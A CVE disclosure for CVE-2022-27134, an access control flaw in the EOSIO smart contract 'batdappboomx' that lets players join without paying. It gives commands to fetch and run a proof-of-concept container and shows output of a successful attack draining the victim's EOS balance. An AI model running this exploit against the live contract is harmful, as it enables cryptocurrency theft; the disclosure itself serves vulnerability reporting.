## CVE ID
CVE-2022-27134

## PRODUCT
`batdappboomx` is a public smart contract running in the [EOSIO blockchain](https://eos.io/). This smart contract rewards cryptocurrency to its participants if they pay some cryptocurrency before. 


## Version
The latest version of this smart contract. The sha256 hash code of the smart contract is 1327c04cf4b56183eddb1a897bbebf5a873d3421272b708829a4ed0765bef820
Check it at the blockchain explorer https://bloks.io/account/batdappboomx.

## PROBLEM TYPE 
access control vulnerability

## DESCRIPTION

`batdappboomx` is not open-source, but we found a vulnerability with [WASAI](https://github.com/WASAIRepo/WASAI). Attackers can join in this game without paying anything. 

1. activate the environment

```bash
git clone https://github.com/Kenun99/CVE-batdappboomx.git && cd CVE-batdappboomx
docker build -t localhost/client-eos:eos .
docker run --rm  --network host -it localhost/client-eos:eos
```

2. attack the victim and steal its cryptocurrency, i.e., `EOS`

```bash
info  2022-03-11T14:28:53.345 keosd     wallet_plugin.cpp:38          plugin_initialize    ]
...
warn  2022-03-11T14:28:53.355 keosd     wallet.cpp:218                save_wallet_file     ] saving wallet to file /root/eosio-wallet/./default.wallet
Creating wallet: default
Save password to use in the future to unlock this wallet.
Without password imported keys will not be retrievable.
saving password to /root/passwd
imported private key for: EOS6MRyAjQq8ud7hVNYcfnVPJqcVpscN5So8BhtHuGYqET5GDW5CV
[+] victim's balance: 100.00 -> 0.00
[+] attacker's balance: 10000000.00 10000100.00

[+] Attacked successfully. Got more cryptocurrency.
```
